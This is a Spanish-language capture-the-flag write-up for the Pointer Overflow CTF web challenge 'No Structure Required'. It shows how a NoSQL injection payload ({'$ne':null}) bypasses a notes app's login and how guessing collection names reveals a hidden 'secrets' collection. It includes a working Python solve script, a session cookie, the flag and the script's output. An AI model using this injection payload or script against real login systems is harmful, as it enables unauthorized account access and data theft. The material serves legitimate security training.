# Writeup — No Structure Required

> **CTF:** Pointer Overflow CTF · **Categoría:** Web 100 · **Wave 3**

> **Reto:** No Structure Required

> **Vulnerabildades explotadas:** 

> 	A05 - Injection

> 	A01 - Broken Access Control

> 	A02 - Authentication Failures

## Presentación

El evento **Pointer Overflow CTF** presenta algo de información antes de cada reto dando un poco de contexto.

```txt
# No Structure Required

SecureNotes v1.0 — a small internal notes platform from a vendor that's long since folded. The staff left behind a login screen, a browse page, and a collection of records they thought they'd deleted.

There's an entry in there your team is supposed to see. It's not in the obvious places.

Credentials? You weren't issued any. See what the login accepts.

The application
Open the SecureNotes login →
The application uses a document store rather than a relational database. There is no schema enforcement.
```

En este caso se indica que los encargados de mantener la aplicación dejaron una página de login, busqueda y una colección de registros sin eliminar.
No indica credenciales conocidas ni el nombre de alguna colección de registros que no haya sido eliminado.

Deja claro que detrás la base de datos se basa en documentos y no en tablas relacionales.

![[./images/Consigna.png|800]]

## Reconocimiento

Al cargar la página principal me encuentro con un login sencillo. Intento loguearme con contraseñas básicas pero son inválidas y analizo el codigo fuente.
![[./images/Base.png|800]]
![[./images/Contraseñas_básicas.png|800]]
![[./images/codigo_fuente.png|800]]

No me puedo loguear como `admin:admin`, pero en el codigo fuente se encuentra un comentario indicando que el loguin se realiza enviando los datos en formato **JSON**.

Observo la petición **POST** generada.
![[./images/Post_raw_data.png|1200]]

## Bypass Login con NoSQL Injection

Intento superar el login sin conocer las contraseñas. En este punto podría intentar injectar código SQL o NoSQL para acceder, pero en la consigna se indica que no se utiliza SQL.
Intento injectar código NoSQL en la petición **POST** cambiando los valores de usuario y contraseña, para que con suerte cuando intente evaluar `contraseña igual a string del usuario` cambie por `contraseña no sea igual a NULL`. 
POST data: `{"username":{"$ne":null},"password":{"$ne":null}}`

![[./images/NoSQL_Injection_valid_login.png|1200]]

Se observa que la respuesta del servidor es 200 y en los Headers se entrega una nueva cookie de **session** con `set-cookie`.

Al utilizar esta nueva cookie puedo ver el dashboard logueado como `j.abernathy`.

![[./images/cambio_cookie_1.png|1200]]

![[./images/Login_jabernathy.png|1200]]

En este punto la explotación de la vulnerabilidad con **Injección NoSQL** fue todo un éxito.

## Descubrir flag

En el dashboard se musetran mis notas (un listado de compra) y que la página `/browse` permite ver datos almacenados con el parámetro `?col=<name>` utilizando peticiones GET.

![[./images/browse.png|1200]]

En este punto se podrían probar varias cosas. 

Loguerse con otro usuario, visualizando el dashboard de `r.calloway` y `sysadmin`. Esto se hizo cambiando la raw-data a la hora de loguearse, cambiando el **username** pero manteniendo **password not equal null**. No se obtuvo información útil.

Intentar romper la query con strings especiales en `?col=string`. No se logró.

Probar con distintos nombres en `?col=` para ver si se encuentra alguna colección de registros oculta por fuerza bruta.

Probando con pocas palabras se logró encontrar una colección `secrets` en la cual se guarda la flag.

![[./images/flag.png|1200]]

Flag: `POCTF{78.1647.5a5551682bbba94a.5HLBJ4TDMWZXNJ5YLS4BIN6NEV}`

## Script automatico.

Para la resolución de este CTF no se necesitó ningún script de automatización.
Se realizo un script `solve.py` que al ejecutarlo imprime la flag obtenida.

```python
#!/usr/bin/env python3
import re, requests, sys

# Configuración
ENDPOINT    = 'https://pointeroverflowctf.com/challenges/no-structure-required/notes-app/'
COOKIE      = 'session=... cookie de sesion ...'

HEADERS = {"Cookie": COOKIE, "Content-Type": "application/json"}

# Payload
NOSQL_PAYLOAD = {"username": {"$ne": None}, "password": {"$ne": None}}
SECRET_COLLECTION = "secrets"
FLAG_RE = re.compile(r"POCTF\{[^}]+\}")

def main():
    print("PASO 1 - Login con NoSQL Injection")

    r = requests.post(ENDPOINT + "login", json=NOSQL_PAYLOAD, headers=HEADERS)
    if r.status_code != 200:
        print(f"Error en login: {r.status_code}")
        sys.exit(1)
    
    print(f"Login exitoso. Status: {r.status_code}")
    print(f"Response: {r.text}")

    print("\nPASO 2 - Obtener cookie de usuario logueado")
    new_cookie = r.headers.get("set-cookie")
    if not new_cookie:
        print("No se recibió nueva cookie de sesión.")
        sys.exit(1)
    
    print(f"New cookie: {new_cookie}")

    print("\nPASO 3 - Acceder a la colección de secretos")
    r = requests.get(ENDPOINT + f"browse?col={SECRET_COLLECTION}", headers={"Cookie": new_cookie, "Content-Type": "application/json"})
    if r.status_code != 200:
        print(f"Error al acceder a la colección de secretos: {r.status_code}")
        sys.exit(1)
    print(f"Acceso exitoso. Status: {r.status_code}")
    print(f"Response: {r.text}")

    print("\nPASO 4 - Extraer la flag")
    match = FLAG_RE.search(r.text)
    if match:
        print(f"Flag encontrada: {match.group(0)}")
    else:
        print("No se encontró la flag en la respuesta.")

if __name__ == "__main__":
    main()
```

## Resultado.

A continuación se observa el resultado de la ejecución exitosa del script de autoresolución.

Este resuelve paso a paso el CTF indicando cada respuesta, la explotación de la vulnerabilidad NoSQL, el cambio de Cookie, la obtención de la colección `secrets` e imprime la FLAG extraída al finalizar.

```bash
$ python3 ./solve.py                    
PASO 1 - Login con NoSQL Injection
Login exitoso. Status: 200
Response: {"message":"Signed in as j.abernathy.","next":"/challenges/no-structure-required/notes-app/dashboard","ok":true}


PASO 2 - Obtener cookie de usuario logueado
New cookie: session=.eJxljclOwzAARP_F5yrGS5w4EkJUlEoIkWPLKfLW1i2xI9skpIh_xwUOlbjOvDfzCVQMuy75k3GgAavt8XE9hna9W96H_kxagbb2NT0_faiRyDTftJuHeTO1y5cVWABto_JBd2IUSYSsH1IaYgOh0q74K8UwFMr38JeJkDJMCa8R46zkiDJKYU1KgSXXlWY1I7LiqpSKIGIo0VoTXAxufxft2dwiXF_dWp0v_-9dEe_RBCd6kzkvTs72wU-5vsQ_NsaELcBkJO2cTyZ2b35vXVPVDWK0ytaxEPIykQ4z-PoGIYJfgQ.avC27Q.bi4gsr84cSxONHX_IOwkW4ao3QA; Secure; HttpOnly; Path=/; SameSite=Lax

PASO 3 - Acceder a la colección de secretos
Acceso exitoso. Status: 200
Response: <!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<title>SecureNotes :: Browse</title>
<style>
  body { background: #eef2f4; color: #1b2530;
         font-family: -apple-system, sans-serif; margin: 0; }
  header { background: #2f4a5b; color: white; padding: .8rem 1.5rem;
           display: flex; justify-content: space-between; align-items: center; }
  header a { color: #cfe3ef; text-decoration: none; font-size: .82rem; }
  main { max-width: 900px; margin: 2rem auto; padding: 0 1.5rem; }
  h2 { color: #2f4a5b; font-weight: normal; font-size: 1.1rem;
       border-bottom: 1px solid #cad2d8; padding-bottom: .3rem; }
  .doc { background: white; border: 1px solid #d5dee3; padding: .8rem 1rem;
         margin: .5rem 0; border-radius: 4px; font-family: monospace;
         font-size: .85rem; white-space: pre-wrap; word-break: break-all; }
  form { margin: 1rem 0; }
  input { padding: .4rem .6rem; border: 1px solid #cad2d8; border-radius: 3px;
          font-family: monospace; }
  button { padding: .4rem 1rem; background: #4b8db3; border: none; color: white;
           border-radius: 3px; cursor: pointer; }
  .note { color: #7a8994; font-size: .85rem; }
</style>
</head><body>
<header>
  <div>SecureNotes / browse</div>
  <div><a href="dashboard">← Dashboard</a></div>
</header>
<main>
  <h2>Collection: <code>secrets</code></h2>
  <form method="get" action="browse">
    <label>Collection name: </label>
    <input type="text" name="col" value="secrets">
    <button type="submit">Load</button>
  </form>
  
    
      <div class="doc">{"_id": 1, "flag": "POCTF{78.1647.5a5551682bbba94a.5HLBJ4TDMWZXNJ5YLS4BIN6NEV}", "label": "team-flag", "note": "Do not share. This is the token the compliance auditor requested. If you can see this, please close the page and return to the login screen."}</div>
    
  
</main>
</body></html>

PASO 4 - Extraer la flag
Flag encontrada: POCTF{78.1647.5a5551682bbba94a.5HLBJ4TDMWZXNJ5YLS4BIN6NEV}
```

